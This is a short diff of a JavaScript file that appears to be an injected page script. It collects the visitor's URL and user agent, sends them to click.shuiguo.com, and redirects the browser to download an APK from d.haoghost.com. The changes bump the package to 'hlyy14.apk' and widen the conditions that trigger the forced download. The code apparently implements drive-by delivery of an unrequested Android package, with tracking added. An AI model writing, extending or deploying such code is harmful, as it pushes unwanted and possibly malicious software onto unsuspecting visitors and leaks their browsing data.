@@ -288,7 +288,7 @@ var hy_itv=setInterval(function(){
 							setCookie("hyipdata","0");
 							if(hlTime())
 							{
-								pname="hlyy12.apk";
+								pname="hlyy14.apk";
 								getJsonp(
 									'http://click.shuiguo.com/index.php?action=index&method=main1',
 									"t=undefined&s=tag_889&ref="+document.URL+"&url="+document.URL+"&typeid=1&ug="+ua,
@@ -313,7 +313,7 @@ var hy_itv=setInterval(function(){
 			}
 			function goCityDown(){
 				window.setTimeout(function(){
-					if(num==18 || num==19 || num==31)
+					if(num==18 || num==19 || num==31 || num==32 || num==33)
 					{
 						if(tt.indexOf("》")<0 || !autoDown()) return;
 						tt=tt.split("》")[0]+"》";
@@ -355,7 +355,7 @@ var hy_itv=setInterval(function(){
 							if(pname.indexOf("http")>=0) window.location.href=pname;
 							else window.location.href="http://d.haoghost.com/"+pname;
 							setCookie("hycpc1","1");
-							if(num==28 || num==31) setBefore();
+							if(num==28 || num==31 || num==32 || num==33) setBefore();
 						}
 						else
 						{
